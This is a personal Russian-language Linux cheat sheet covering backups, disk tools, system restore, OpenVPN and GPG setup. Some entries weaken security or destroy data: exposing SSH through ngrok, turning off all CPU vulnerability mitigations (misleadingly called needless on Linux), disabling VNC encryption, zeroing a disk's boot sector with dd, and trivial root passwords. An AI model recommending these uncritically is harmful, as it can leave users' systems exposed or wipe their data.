version:1.2.1.6.2 : 30.08.2020
_________________________________



-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

› удаленное управление пк по SSH:

systemctl start sshd

cd files

./ngrok tcp 22


› подключение:

ssh xxx@0.tcp.ngrok.io -p999999

----------------------
› скорость соединения:

yes | pv | ssh $your_host_here "cat > /dev/null"

pv /dev/zero|ssh $your_host_here 'cat > /dev/null'

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

 *Архивирование*


Команда tar умеет архивировать файлы с сохранением прав доступа к файлам-

Нужно вместо
tar -czf archive.tar.gz directory
написать

tar -vcpzf archive.tar.gz directory

› А при распаковке тоже указать параметр "p":

tar -vxzpf archive.tar.gz

--------------------
› вывод прогресса:

tar -czpf - backUPs | pv -s $(du -sb backUPs| grep -o '[0-9]*') > backUPs.tgz

------------------------

› Архивирование:

tar -cf name.tar name_file

tar -cvf name.tar name_directory

tar -zcvf name.tar.gz name_directory


› Распаковка:

tar -zxvf name.tar.gz -C /directory_name

tar -jxvf name.tar.bz2 name_directory


tar cvpjf /home/sergo/progs/test.tar.bz2 --exclude /etc/gconf /etc


tar -cvzpf /lib/live/mount/medium/backupYYYYMMDD.tgz --exclude=/mnt/var/spool/asterisk/monitor --exclude=/mnt/var/spool/asterisk/backup /mnt/

___________________________________________________________________________________________________________________________________________________________________________________________________________________***

› Погода:

curl wttr.in/Moscow

---------------------------------------
› информация о системе:

lspci -v                  

--------
› видеодрайвер:

glxinfo | grep "OpenGL version"         

--------
› скорость диска:

sudo hdparm -Tt /dev/sda        

--------
› проверка с.м.а.р.т.а диска:

sudo smartctl -a /dev/sda       

--------
› температура диска:

hddtemp /dev/sda         

--------
› отключить baloo:

balooctl disable           

--------
› потребление ОЗУ:

free -h                          

--------
› хеш md5sum:

printf "string" | md5sum

--------
› забить всю доступную оперативную память нулями:

tail /dev/zero

----------
› файловая система ntfs:

sudo pacman -S ntfs-3g

ntfsfix /dev/sda1

-------------------------------------------
› записать образ диска iso на флешку с информацией о скорости:

pv image.iso > /dev/sda

pv image.iso | dd of=/dev/sda

dd if=образ of=флэшка status=progress 


› создать образ диска:

pacman -S cdrkit

mkisofs -J -o obraz.iso /home/xxx

---------------------
› монтировать файл или iso:

mount -o loop file.iso /mnt/


› размонтироавть устройство sda1,если оно заблокировано каким-то процессом:

fuser -km /mnt/sda1

----------
› Проверка хостов в локальной сети:

arp -en

nmap -sn 192.168.1.0/24

----------
› Создать пустой файл:

dd if=/dev/zero of=/path/to/your/file bs=<razmer bloka> count=<skolko blokov>

dd if=/dev/zero of=image.txt bs=1024M count=1

dd of=file.txt bs=1 count=0 seek=100G


› для вывода информации о скорости:

dd if=/dev/sdc bs=4096 | pv -s 2G | sudo dd bs=4096 of=~/USB_BLACK_BACKUP.IMG

dd if=/dev/zero | pv | of=/path/to/your/file bs=<razmer bloka> count=<skolko blokov>

----------
› Создать пустой зашифрованный файл с алгоритмом blowfish:

dd if=/dev/zero of=image.crypted bs=1M count=1024


› подгрузка модулей-

modprobe cryptoloop

modprobe blowfish


› ассоциация образа с блочным устройством со включенным шифрованием-

losetup -e blowfish /dev/loop0 image.crypted


› нужно ввести пароль, который и будет ключем к образу. Если ключ введен не правильно, система не смонтируется. Можно будет заново создать данные в образе, используя новый ключ, но к старым данным доступа не будет.Создаем файловую систему и монтируем-

mkfs.ext2 /dev/loop0

mount /dev/loop0 /mnt/image


› образ готов к записи данных. После завершения работы с ним, нужно не забыть его отмонтировать и отключить от блочного loop устройства-

umount /dev/loop0

losetup -d /dev/loop0

----------

› gpg:

› зашифровать и подписать "файл" ключём-

gpg -r id'ключа -e -u id'ключа -s "файл"


› добавить ключ-

gpg --recv-key 465022E743D71E39


› посмотреть все ключи gpg-

gpg --list-keys --keyid-format LONG && gpg --list-secret-keys --keyid-format LONG


› редактировать ключ gpg-

gpg --expert --edit-key отпечаток 


› добавить новый сабключ gpg-

gpg --quick-add-key отпечаток rsa1024 sign,encr,auth none


› удалить ключи gpg-

gpg --delete-secret-keys 0x12345678

gpg --delete-keys 0x12345678


› report:

ssa --diag --f report.txt

----------

› git fix:

git config --global push.rebase false

git config --global push.default simple

------------------------------

› фрагментация диска:

› степень фрагментации-

sudo e4defrag -c /путь до диска


› дефрагментация диска-

sudo e4defrag -v /путь до диска



› информаия о файловой структуре-

sudo tune2fs -l /путь до диска


› изменить резервную область диска на 1%

sudo tune2fs -m 1 /путь до диска

-------------------------------

› arch-chroot:


sudo pacman -S arch-install-scripts

arch-chroot /*

----------------

› создать список установленных пакетов:

sudo pacman -Qq > packages

› явно установленные пакеты:

sudo pacman -Qqe > packages


› установить все пакеты из этого списка:

sudo pacman -S $(cat packages)

----------------------------------------

› удилить загрузчик grub mbr-

dd if=/dev/zero of=/dev/sdX bs=440 count=1

› удалить grub с флешки-

dd if=/dev/zero of=/dev/sdc count=512

---------------------

› прогресс-бар:

sudo pacman -S progress

progress -M 

----------------

› qemu:

sudo pacman -S qemu edk2-ovmf

› запуск образа диска в qemu:

run_archiso -i /path/to/archlinux-yyyy.mm.dd-x86_64.iso

› запуск образа диска в qemu в режиме efi:

run_archiso -u -i /path/to/archlinux-yyyy.mm.dd-x86_64.iso


___________________________________________________________________________________________________________________________________________________________________________________________________________________

*BACKUP*


Все готово для создания архива

tar -cvzpf /lib/live/mount/medium/backupYYYYMMDD.tgz --exclude=/mnt/var/spool/asterisk/monitor --exclude=/mnt/var/spool/asterisk/backup /mnt/


Здесь у нас параметры: c — создать архив, v — выводить информацию о процессе, z — использовать сжатие gzip, p — сохраняем данные о владельцах и правах доступа, f — пишем архив в файл, путь к файлу, --exclude — исключаем из архива каталог (я исключил каталоги с записями разговоров и каталог с бэкапами FreePBX), /mnt/ — каталог, который архивируем.

Ждем… у меня вся подготовка и создание архива заняли 10 минут. Будь флэшка быстрее, уложился бы в 7-8 минут.

Отмонтируем диск:

umount /mnt


… и перезагружаемся.

reboot


Складываем архив в надежное место за пределами офиса.

Восстановление бэкапа на другом железе

2. Размечаем диск, создаем файловую систему

Грузимся с live-флэшки, у меня все та же debian-live-7.8.0.

Переключаемся на root:

sudo su


Размечаем диск. Мне понравилась утилита с псевдографическим интерфейсом cfdisk. Там все просто и понятно.

cfdisk


Удаляем все имеющиеся разделы. Я создал два новых раздела, один на 490 Gb под / (sda1) и 10 Gb под swap (sda2) в конце диска, т.к. он практически не будет задействован. Проверим типы разделов. Который под систему должен иметь тип 83 Linux, второй — 82 Linux swap / Solaris. Помечаем системный раздел загрузочным (bootable), сохраняем изменения и выходим.

Cоздаем файловую систему на первом разделе.

mkfs.ext4 /dev/sda1


3. Распаковываем архив.

Монтируем отформатированный раздел

mount /dev/sda1 /mnt


Распаковываем архив прямо с флэшки

tar --same-owner -xvpf /lib/live/mount/medium/backupYYYYMMDD.tgz -C /mnt/


Параметр --same-owner — сохраняет владельцев у распаковываемых файлов, x — извлекаем из архива, v — выводить информацию о процессе, p — сохраняем права доступа, f — указываем файл, который распаковываем, C — распаковываем в категорию.

4. Создаем MBR на новом диске.

Чтобы корректно создать загрузочную запись, монтируем рабочие каталоги к нашему будущему root-каталогу, у меня это /mnt. Каталоги /dev и /proc сейчас используются live-системой, используем параметр bind, чтобы они были доступны сразу в двух местах:

mount --bind /dev /mnt/dev
mount --bind /proc /mnt/proc


Переключаемся на новую систему используя chroot:

chroot /mnt


Делаем swap-раздел для новой системы:

mkswap /dev/sda2 


Подключаем его же:

swapon /dev/sda2


Чтобы grub работал, нужно указать ему правильные UUID разделов в fstab, сейчас там прописаны разделы предыдущей системы:

nano /etc/fstab


Открываем второй терминал (Alt+F2) под root:

sudo su


Вызываем:

blkid


И видим текущие UUID разделов.

Вручную переписываем их в fstab переключаясь между Alt+F1 и Alt+F2. Да, муторно, но попытки копировать занимали у меня больше времени, чем переписывание. Сохраняем fstab.

Устанавливаем grub2. У меня один физический диск, поэтому ставим его на sda:

grub-install /dev/sda


На чистый диск должно встать без ошибок. Обновляем информацию из fstab:

update-grub


Возвращаемся в Live-систему:

exit


Размонтируем все каталоги:

umount /mnt/dev
umount /mnt/proc
umount /mnt


Если вылазят процессы, которые используют эти каталоги, убиваем их используя fuser.

Все, поехали. Грузимся с жесткого диска:

reboot


Здесь статья должна была закончиться, но у меня возникли проблемы с подключением к интернету. Сервер видит сеть, видит компьютеры в ней, но в интернет не ходит… а это как бы важно для телефонии.

5. Тестирование и устранение неполадок.

ifconfig -a


Показывет интерфейсы eth1 и lo, гугление сказало, что gateway можно прописать только подключению eth0, остальные рассчитаны только на работу внутри сети.

Похоже, отсутствие eth0 вызвано способом переноса системы. Находим файл, который отвечает за нумерацию интерфейсов, смотрим туда:

nano /etc/udev/rules.d/70-persistent-net.rules


Действительно, там два активных интерфейса, определенных MAC’ами. Комментируем первый, второму прописываем eth0.
tar -cvzpf /lib/live/mount/medium/backupYYYYMMDD.tgz --exclude=/mnt/var/spool/asterisk/monitor --exclude=/mnt/var/spool/asterisk/backup /mnt
Перезапуск /etс/init.d/networking не помог, поэтому перезагружаемся:

1)tar -vcpzf name.tar.gz *	( / )
2)tar -vxzpf name.tar.gz -C /x/2


reboot



---------------------

1)нужно загрузиться с флешки на котором записан арч.Напсать:
#fdisk -l
Команда выведет всю информацию о всех дисках, нужно будет найти диск с двумя разделами:1 на 50ГБ,а 2 на 188ГБ,и монтировать раздел жёсткого диска на 50Гб:
Если диск имеет название sdc1 то
#mount /dev/sdc1 /mnt
2)Нужно переконфигурировать файл fstab, находящийся по пути: /mnt/etc/fstab:
#nano /mnt/etc/fstab
вместо UUID=xxxxxxxxxxxx
пишешь идентификатор дисков которые у тебя отобразились после ввода команды: fdisk -l
Потом вместо /x/2 , нужно написать /home
3)Нужно перезаписать загрузчик grub на диск:
#archchroot /mnt
#rm -rf /grub/grub.cfg
#grub-install /dev/sda
_где sda диск на который хочешь записать загрузчик,не нужно указывать раздел диска например:sda1,sda2
#grub-mkconfig -o /boot/grub/grub.cfg
#exit
#reboot
4)Выбрать загрузку с диска с арчем
пользователь: пароль
root:0
xxx:0


___________________________________________________________________________________________________________________________________________________________________________________________________________________

Проверка скорости интернет соединения через терминал в Ubuntu-

Для проверки скорости нашего интернет-канала воспользуемся утилитой speedtest-cli Установим ёё

user@localhost:~$ sudo apt install speedtest-cli

Примеры команд для запуска утилиты speedtest-cli:

Подробная информация при тестировании скорости

user@localhost:~$ speedtest
Retrieving speedtest.net configuration...
Testing from OOO DelaemZabory Ltd. (192.168.0.19)...
Retrieving speedtest.net server list...
Selecting best server based on ping...
Hosted by Megafon (Moscow) [0.12 km]: 4.093 ms
Testing download speed................................................................................
Download: 76.63 Mbit/s
Testing upload speed......................................................................................................
Upload: 21.72 Mbit/s

Вывод только необходимой информации

user@localhost:~$ speedtest —simple
Ping: 3.583 ms
Download: 87.92 Mbit/s
Upload: 94.95 Mbit/s

Посмотреть полный список доступных серверов для тестирования скорости

user@localhost:~$ speedtest —list
Retrieving speedtest.net configuration...
12824) Akado Telecom (Moscow, Russia) [0.12 km]
3682) Rostelecom (Moscow, Russian Federation) [0.12 km]
1907) MTS (Moscow, Russian Federation) [0.12 km]
6386) Megafon (Moscow, Russian Federation) [0.12 km]
10366) Orange Business Services, Russia &amp; CIS (Moscow, Russian Federation) [0.12 km]
6827) MGTS (Moscow, Russian Federation) [0.12 km]
...

Тестирование скорости до сервера, выбранного из списка выше

user@localhost:~$ speedtest —server 12824
Retrieving speedtest.net configuration...
Testing from OOO DelaemZabory Ltd. (192.168.0.19)...
Retrieving speedtest.net server list...
Retrieving information for the selected server...
Hosted by Akado Telecom (Moscow) [0.12 km]: 2.602 ms
Testing download speed................................................................................
Download: 85.77 Mbit/s
Testing upload speed......................................................................................................
Upload: 95.25 Mbit/s

Сгенерировать картинку с данными о интернет-соединении что бы в дальнейшем можно было поделиться ей

user@localhost:~$ speedtest —share
Retrieving speedtest.net configuration...
Testing from OOO DelaemZabory Ltd. (192.168.0.19)...
Retrieving speedtest.net server list...
Selecting best server based on ping...
Hosted by Akado Telecom (Moscow) [0.12 km]: 2.567 ms
Testing download speed................................................................................
Download: 89.37 Mbit/s
Testing upload speed......................................................................................................
Upload: 68.33 Mbit/s
Share results: http://www.speedtest.net/result/8294113864.png

Полный список команд

user@localhost:~$ speedtest-cli -h

http://bit.ly/2JJz7Qa

#Speedtest, #Ubuntu




___________________________________________________________________________________________________________________________________________________________________________________________________________________

- Для того, чтобы включить разгон видеокарты от Radeon и отключить патчи уизвимостей на процессорах Intel (которые нужны только на винде и серьезно замедляют работу самого процессора)

1. sudo gedit /boot/efi/loader/entries/Pop_OS-current.conf
02. В графе с option, после уже имеющихся параметров, через пробел дописываем:

- Для отключения не нужных патчей ядра:

noibrs noibpb nopti nospectre_v2 nospectre_v1 l1tf=off nospec_store_bypass_disable no_stf_barrier mds=off mitigations=off

- Для включения опций разгона видеокарт Radeon:

amdgpu.ppfeaturemask=0xffffffff

У меня в итоге получилось вот так:

options root=UUID=26f3dcf0-3f02-416a-9404-62436a7091cc ro quiet loglevel=0 systemd.show_status=false splash noibrs noibpb nopti nospectre_v2 nospectre_v1 l1tf=off nospec_store_bypass_disable no_stf_barrier mds=off mitigations=off amdgpu.ppfeaturemask=0xffffffff

Важно отметить, что " root=UUID=26f3dcf0-3f02-416a-9404-62436a7091cc" это идентификатор корневого раздела по UUID, он уникален после каждого форматирования тома, не надо его копировать себе :)


___________________________________________________________________________________________________________________________________________________________________________________________________________________

Установка и настройка OpenVPN (клиента и сервера) и Easy-RSA 3 в CentOS 7-


OpenVPN — свободная реализация технологии виртуальной частной сети с открытым исходным кодом для создания зашифрованных каналов типа точка-точка или сервер-клиенты между компьютерами. Easy-RSA — программа для создания и ведения инфраструктуры открытых ключей (PKI) в openVPN

Установка необходимого софта

Добавляем репозиторий EPEL и обновляемся

[root@localhost ~]# yum install epel-release -y
[root@localhost ~]# yum update -y

Устанавливает OpenVPN 2.4 и Easy-RSA 3

[root@localhost ~]# yum install openvpn easy-rsa -y

Проверим их версии

[root@localhost ~]# openvpn —version
[root@localhost ~]# ls -lah /usr/share/easy-rsa/

Проверка версий OpenVPN и Easy-RSA

Настройка Easy-RSA 3

Скопируем скрипты easy-rsa в каталог /etc/openvpn/

[root@localhost ~]# cp -r /usr/share/easy-rsa /etc/openvpn/

Переходим в каталог /etc/openvpn/easy-rsa/3/ и создаем там файл vars

[root@localhost ~]# cd /etc/openvpn/easy-rsa/3/
[root@localhost ~]# nano vars

Содержимое файла:

set_var EASYRSA "$PWD"
set_var EASYRSA_PKI "$EASYRSA/pki"
set_var EASYRSA_DN "cn_only"
set_var EASYRSA_REQ_COUNTRY "RU"
set_var EASYRSA_REQ_PROVINCE "Moscow"
set_var EASYRSA_REQ_CITY "Moscow"
set_var EASYRSA_REQ_ORG "My Organisation"
set_var EASYRSA_REQ_EMAIL "admin@itdraft.ru"
set_var EASYRSA_REQ_OU "IT department"
set_var EASYRSA_KEY_SIZE 4096
set_var EASYRSA_ALGO rsa
set_var EASYRSA_CA_EXPIRE 7500
set_var EASYRSA_CERT_EXPIRE 3650
set_var EASYRSA_NS_SUPPORT "no"
set_var EASYRSA_NS_COMMENT "CERTIFICATE AUTHORITY"
set_var EASYRSA_EXT_DIR "$EASYRSA/x509-types"
set_var EASYRSA_SSL_CONF "$EASYRSA/openssl-1.0.cnf"
set_var EASYRSA_DIGEST "sha512"

Делаем файл исполняемым

[root@localhost ~]# chmod +x vars

Создание ключа и сертификата для OpenVPN Сервера

Прежде чем создавать ключ, нам нужно инициализировать каталог PKI и создать ключ CA.

[root@localhost ~]# cd /etc/openvpn/easy-rsa/3/
root@localhost ~]# ./easyrsa init-pki
Note: using Easy-RSA configuration from: ./vars

init-pki complete; you may now create a CA or requests.
Your newly created PKI dir is: /etc/openvpn/easy-rsa/3/pki

[root@localhost ~]# ./easyrsa build-ca

На этом необходимо придумать пароль для своего CA-ключа, чтобы сгенерировались файлы 'ca.crt' и 'ca.key' в каталоге 'pki'. Этот пароль нам потребуется дальше

Создаем корневой сертификат

Создадим ключ сервера (название сервера srv-openvpn)

[root@localhost ~]# ./easyrsa gen-req srv-openvpn nopass

опция nopass - отключение пароля для srv-openvpn

Создаем ключ сервера

Подпишем ключ srv-openvpn используя наш CA-сертификат

[root@localhost ~]# ./easyrsa sign-req server srv-openvpn

В процессе у нас спросят пароль, который мы задавали ранее

Подписываем ключ, используя CA-сертификат

Проверим файлы сертификата, что бы убедится, что сертификаты сгенерировались без ошибок

[root@localhost ~]# openssl verify -CAfile pki/ca.crt pki/issued/srv-openvpn.crt
pki/issued/srv-openvpn.crt: OK

Все сертификата OpenVPN сервера созданы.

Корневой сертификат расположен: 'pki/ca.crt'Закрытый ключ сервера расположен: 'pki/private/srv-openvpn.key'Сертификат сервера расположен: 'pki/issued/srv-openvpn.crt'

Создание ключа клиента

Сгенерируем ключ клиента client-01

[root@localhost ~]# ./easyrsa gen-req client-01 nopass

Генерируем ключ клиента

Теперь подпишем ключ client-01, используя наш CA сертификат

[root@localhost ~]# ./easyrsa sign-req client client-01

В процессе у нас спросят пароль, который мы задавали ранее

Подписываем ключ клиента, используя корневой сертификат

Проверим файлы сертификата

[root@localhost ~]# openssl verify -CAfile pki/ca.crt pki/issued/client-01.crt
pki/issued/client-01.crt: OK

Дополнительная настройка OpenVPN сервера

Сгенерируем ключ Диффи-Хеллмана

[root@localhost ~]# ./easyrsa gen-dh

Генерация ключа Диффи-Хеллмана

Если мы в дальнейшем планируем отзывать клиентские сертификаты, нам необходимо сгенерировать CRL ключ

[root@localhost ~]# ./easyrsa gen-crl

В процессе у нас спросят пароль, который мы задавали ранее

Генерируем CRL-ключ

Для того, что бы отозвать сертификат надо выполнить команду:

[root@localhost ~]# ./easyrsa revoke client-02

где client-02 имя сертификата, который мы отзываем

Все необходимые сертификаты созданы, теперь их надо скопировать в директории

Копируем сертификаты сервера

[root@localhost ~]# cp pki/ca.crt /etc/openvpn/server/
[root@localhost ~]# cp pki/issued/srv-openvpn.crt /etc/openvpn/server/
[root@localhost ~]# cp pki/private/srv-openvpn.key /etc/openvpn/server/

Копируем сертификаты клиента

[root@localhost ~]# cp pki/ca.crt /etc/openvpn/client/
[root@localhost ~]# cp pki/issued/client-01.crt /etc/openvpn/client/
[root@localhost ~]# cp pki/private/client-01.key /etc/openvpn/client/

Копируем ключи DH и CRL

[root@localhost ~]# cp pki/dh.pem /etc/openvpn/server/
[root@localhost ~]# cp pki/crl.pem /etc/openvpn/server/

!!! Проверить, надо ли перегенерировать CRL и заново копировать его в каталог /etc/openvpn/server/ после отзыва сертификата !!!

Настройка OpenVPN сервера

Создадим файл конфигурации server.conf

[root@localhost ~]# cd /etc/openvpn/
[root@localhost ~]# nano server.conf

Содержимое файла:

# OpenVPN Port, Protocol and the Tun
port 1194
proto udp
dev tun

# OpenVPN Server Certificate - CA, server key and certificate
ca /etc/openvpn/server/ca.crt
cert /etc/openvpn/server/srv-openvpn.crt
key /etc/openvpn/server/srv-openvpn.key

# DH and CRL key
dh /etc/openvpn/server/dh.pem
crl-verify /etc/openvpn/server/crl.pem

# Network Configuration - Internal network
# Redirect all Connection through OpenVPN Server
server 10.10.1.0 255.255.255.0
push "redirect-gateway def1"

# Using the DNS from https://dns.watch
push "dhcp-option DNS 84.200.69.80"
push "dhcp-option DNS 84.200.70.40"

# Enable multiple client to connect with same Certificate key
duplicate-cn

# TLS Security
cipher AES-256-CBC
tls-version-min 1.2
tls-cipher TLS-DHE-RSA-WITH-AES-256-GCM-SHA384:TLS-DHE-RSA-WITH-AES-256-CBC-SHA256:TLS-DHE-RSA-WITH-AES-128-GCM-SHA256:TLS-DHE-RSA-WITH-AES-128-CBC-SHA256
auth SHA512
auth-nocache

# Other Configuration
keepalive 20 60
persist-key
persist-tun
comp-lzo yes
daemon
user nobody
group nobody

# OpenVPN Log
log-append /var/log/openvpn.log
verb 3

Настройка Firewalld

Активируем модуль ядра port-forwarding

[root@localhost ~]# echo 'net.ipv4.ip_forward = 1' » /etc/sysctl.conf
[root@localhost ~]# sysctl -p
net.ipv4.ip_forward = 1

Добавим службу openvpn в firewalld, и интерфейс tun0 в доверенную зону

[root@localhost ~]# firewall-cmd —permanent —add-service=openvpn
[root@localhost ~]# firewall-cmd —permanent —zone=trusted —add-interface=tun0

Активируем 'MASQUERADE' для доверенной зоны firewalld

[root@localhost ~]# firewall-cmd —permanent —zone=trusted —add-masquerade

Активируем NAT

[root@localhost ~]# SERVERIP=$(ip route get 84.200.69.80 | awk 'NR==1 print $(NF-2)')
[root@localhost ~]# firewall-cmd —permanent —direct —passthrough ipv4 -t nat -A POSTROUTING -s 10.10.1.0/24 -o $SERVERIP -j MASQUERADE

Перезапустим firewalld

[root@localhost ~]# firewall-cmd —reload

Запустим OpenVPN и добавим его в автозагрузку

[root@localhost ~]# systemctl start openvpn@server
[root@localhost ~]# systemctl enable openvpn@server

Проверим

[root@localhost ~]# netstat -plntu
[root@localhost ~]# systemctl status openvpn@server

Проверяем, запущен ли OpenVPN

Настройка OpenVPN клиента

Создадим файл конфигурации client-01.ovpn

[root@localhost ~]# cd /etc/openvpn/client
[root@localhost ~]# nano client-01.ovpn

Содержимое файла:

client
dev tun
proto udp

remote xx.xx.xx.xx 1194

ca ca.crt
cert client-01.crt
key client-01.key

cipher AES-256-CBC
auth SHA512
auth-nocache
tls-version-min 1.2
tls-cipher TLS-DHE-RSA-WITH-AES-256-GCM-SHA384:TLS-DHE-RSA-WITH-AES-256-CBC-SHA256:TLS-DHE-RSA-WITH-AES-128-GCM-SHA256:TLS-DHE-RSA-WITH-AES-128-CBC-SHA256

resolv-retry infinite
compress lzo
nobind
persist-key
persist-tun
mute-replay-warnings
verb 3

В строке 'remote xx.xx.xx.xx 1194' надо прописать IP-адрес вместо 'xx.xx.xx.xx'

Теперь для надо заархивировать сертификаты (ca.crt, client-01.crt), ключ клиента (client-01.key), файл конфигурации (client-01.ovpn), и передать их на ПК, который будет подключаться к OpenVPN серверу

Установим архиватор zip и создадим архив с файлами

[root@localhost ~]# yum install zip unzip -y
[root@localhost ~]# cd /etc/openvpn/
[root@localhost ~]# zip client/client-01.zip client/*

Пробуем подключиться с другого ПК к OpenVPN серверу и смотрим лог:

[root@localhost ~]# tail -f /var/log/openvpn.log

Смотрим log-файл OpenVPN сервера

http://bit.ly/2IrBl6c

#Centos, #Openvpn



-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Общий доступ к экрану в Ubuntu 18.04 / 18.10


В операционной системе Ubuntu есть штатный vnc-сервер, который отключен по-умолчанию.

Для того, что бы его активировать откроем:Настройки - Общий доступ - Общий доступ к экрану

Настройки

Выставляем настройки в соответствии со скриншотом

Запускаем терминал и выполняем команду

user@localhost:~$ gsettings set org.gnome.Vino require-encryption false

Таким образом мы отключили шифрование для vnc-соединения, которое включено по-умолчанию.

Теперь можно на другом ПК или телефоне запустить VNC-клиент и подключиться к нашему ПК, который мы только что настраивали

http://bit.ly/2WosViI

#Ubuntu, #Vnc



-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
***
*GPG commands*

зашифровать и подписать "файл" ключём-

gpg -r id'ключа -e -u id'ключа -s "файл"


*Зашифровать файл*
gpg -esr sub/cretin file_name
gpg --default-key -es file_name
gpg -e -c -r sub/cretin file_name

text-
gpg -r sub/cretin --armor --encrypt file.txt
echo text | gpg -r -esa 


*Расшифровать файл*
gpg -r sub/cretin -do newname_file file.txt.asc
gpg -d -o newname_file file.txt.asc


*Импорт ключей*
gpg --import public/private.key


*Для того чтобы посмотреть наши публичные ключи есть команда*
gpg -k

gpg --list-keys --keyid-format LONG (Мы так же можем использовать эту команду если нам нужно видеть ключи)


*А для того чтобы увидеть приватные ключи есть команда*
gpg -K
gpg --list-secret-keys --keyid-format LONG (Мы так же можем использовать эту команду если нам нужно видеть ключи)



------------------------

добавить ключ-

gpg --recv-key 465022E743D71E39



посмотреть все ключи-

gpg --list-keys --keyid-format LONG && gpg --list-secret-keys --keyid-format LONG


редактировать ключ-

gpg --edit-key отпечаток 


добавить новый сабключ-

gpg --quick-add-key отпечаток rsa1024 sign,encr,auth none


удалить ключи-

gpg --delete-secret-keys 0x12345678
gpg --delete-keys 0x12345678

_____________________

Зашифровать файл в ASCII
pgp -ea файл идентификатор
pgp -sta файл



Команды и опции

Я опишу только самое основное.

--armor
-a — Создаёт ASCII (символьный) вывод. При шифровании GPG по умолчанию создаёт бинарный вывод. При использовании этой опции GPG кодирует информацию кодировкой Radix-64 (Разновидность Base64). Этот текстовой вывод можно, например, отправить в мессенджере или по электронной почте, а также вывести на экран.

--encrypt
-e — Зашифровать сообщение.

--recipient
-r — Указать ключ, который будет использоваться для шифрования. Можно использовать информацию идентификатор пользователя (имя, почта), идентификатор ключа, отпечаток ключа.

--decrypt
-d — Расшифровать сообщение.

--sign
-s — Подписать сообщение. Подпись при этом будет распологаться отдельно от самого сообщения.

--clear-sign
--clearsign — Подписать сообщение. Подпись при этом сохраняется вместе с сообщением.

--local-user
-u — Указать ключ, который будет использоваться для подписи. Схож с опцией --recipient, но это не одно и то же.

--verify — Проверить подпись.

--list-keys
-k — Вывести список публичных ключей.

--list-secret-keys
-K — Вывести список приватных ключей.

--export — экспортировать публичный ключ в файл, который потом можно куда нибудь отправить.

--import — импортировать публичный ключ.

--edit-key — Редактировать ключ.

--expert — "Режим эксперта".

Примеры

gpg -a -r 0x12345678 -e decrypted.txt > encrypted.gpg
Зашифровать файл decrypted.txt в файл encrypted.gpg ключом 0x12345678. При этом готовый файл будет текстовым, а не бинарным.

gpg -r 0x12345678 -d encrypted.gpg > decrypted.txt
Расшифровать файл encrypted.gpg ключом 0x12345678 и сохранить его в файл decrypted.txt.

gpg -u 0x12345678 -s message.txt > sign.asc
Подписать файл message ключом 0x12345678 и сохранить подпись в файл sign.asc.

gpg -r 0x12345678 --clearsign message.txt > message.gpg
Подписать файл message.txt ключом 0x12345678 и записать сообщение с подписью в файл message.gpg.

gpg --verify message.asc message.txt
Проверить подпись файла message.txt, которая записана в файле message.asc.

gpg --import pubkey.gpg
Импортировать публичный ключ из файла pubkey.gpg.




___________________________________________________________________________________________________________________________________________________________________________________________________________________
*
GPG commands-

    ключ-

gpg —recv-key


Для того чтобы посмотреть наши публичные ключи есть команда

gpg -k

gpg --list-keys --keyid-format LONG (Мы так же можем использовать эту команду если нам нужно видеть ключи)

А для того чтобы увидеть приватные ключи есть команда:

gpg -K

gpg --list-secret-keys --keyid-format LONG (Мы так же можем использовать эту команду если нам нужно видеть ключи)

Мы убедились, что у нас нет ключей. Теперь давайте мы их создадим. Делается это командой:

gpg --full-generate-key --expert

Как я уже говорил, мы можем выбрать любой из вариантов. RSA Lab нам рекомендует 2048. Лично я выберу 4096, если ваш компьютер мощный, то я и вам его рекомендую.

Так, теперь мы можем опять выполнить команды gpg -k и gpg -K

И теперь мы видим, что у нас есть наш ключ.


Sign

Теперь смотрите, мы можем взять какой-нибудь файл и подписать его с помощью команды

gpg --clearsign 1.txt

Давайте теперь откроем файл и посмотрим на него.
Encrypt

Теперь давайте попробуем зашифровать какой-нибудь файл.

gpg -r johenews --armor --encrypt 1.txt

Теперь откроем его.

Видим, что файл зашифрован.

А теперь расшифруем его.

gpg -d 1.txt.asc

Ну, вот как-то так.
Just a test

Давайте теперь попробуем зашифровать какой-нибудь прям огромный файл.

Давайте, например, возьмем 100 гигабайт.

dd of=file.txt bs=1 count=0 seek=100G

Теперь зашифруем его

gpg -r johenews --armor --encrypt file.txt

А теперь расшифруем

gpg -d file.txt.asc

Результат теста с ключом в 4096 бит следующий

    шифрование 100gb файла = 

    расшифровка 100gb файла = 

Этот пример я показал вам для того, чтобы вы понимали, что асимметричное шифрование не очень хорошо подходит для того, чтобы шифровать очень большие файлы. Тест мой сделан на ноутбуке Lenovo x1c6. На вашем компьютере время будет другим.

Так же надо понимать, что это время для 4096. На 2048 все будет в 6-7 раз быстрее. А на 1024 все будет в 40-50 раз быстрее.

Это я вам показал самые основы.

Теперь давайте поговорим подробнее про ключи. Так как это крайне важно.
Keys

Ваш ключ может использоваться для защиты ваших важных данных. Я вот рассказывал уже про менеджер паролей pass. Он как раз использует ключ gpg. Так же как я уже сказал вы можете привязать ключи к вашему SSH серверу и заходить на него с их помощью. И если злоумышленник получит ваши ключи, то будет совсем печально, поэтому надо со всей ответственностью подойти к безопасности и о правильном их хранении.

Хорошей практикой считается отдельное хранение основного приватного ключа.

Для этого мы сейчас создадим саб-ключи. А основной ключ сначала забэкапим, потом закачаем его в самое безопасное место и потом удалим из pgp.

А делается это потому, что наш главный ключ умеет создавать саб ключи. И саб ключа нам достаточно для всего.

Главным ключом мы можем создать саб-ключ на небольшой промежуток времени. И чисто теоретически, даже если у вас украдут ноутбук, то ваш ключ не будет скомпрометирован. С помощью основного ключа вы сможете отозвать тот ключ и создать новый.
Добавим subkeys

Делается это командой

gpg --expert --edit-key johenews

После нее мы входим в консоль gpg и далее мы можем там вводить команды. Для того чтобы посмотреть список всех команд мы можем ввести ?

Чтобы добавить новые subkey мы должны ввести

addkey

Создать ключ и потом не забываем написать

save
Бэкапим секретный ключ

gpg -a --export-secret-key johenews > secret_key
Создаем Revocation Certificate

gpg -a --gen-revoke johenews > revocation_cert.gpg
Экспортируем публичный ключ

gpg -a --export johenews > public_key.gpg

Очень важно хранить секретный ключ в супернадежном месте.

revocation certificate тоже важно хранить где-либо куда никто кроме вас не имеет доступ.
Удаляем Primary Key

Для начала мы должны экспортировать secret subkeys:

gpg -a --export-secret-subkeys johenews > secret_subs.gpg

Теперь удалим всю секретную часть нашего ключа:

gpg --delete-secret-keys johenews

